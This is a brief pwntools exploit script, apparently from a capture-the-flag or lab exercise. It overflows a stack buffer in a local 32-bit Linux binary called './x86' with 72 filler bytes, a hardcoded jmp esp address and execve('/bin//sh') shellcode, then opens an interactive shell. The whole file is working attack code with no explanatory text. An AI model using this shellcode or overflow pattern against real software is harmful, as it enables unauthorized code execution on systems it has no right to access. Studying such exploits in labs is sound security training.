from pwn import *

context(os='linux',arch='i386',log_level='debug')

shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
jmpesp = p32(0xf7dd1365)

pay = b'a' * 72 + jmpesp + shellcode

p=process(argv=["./x86",pay])
p.interactive()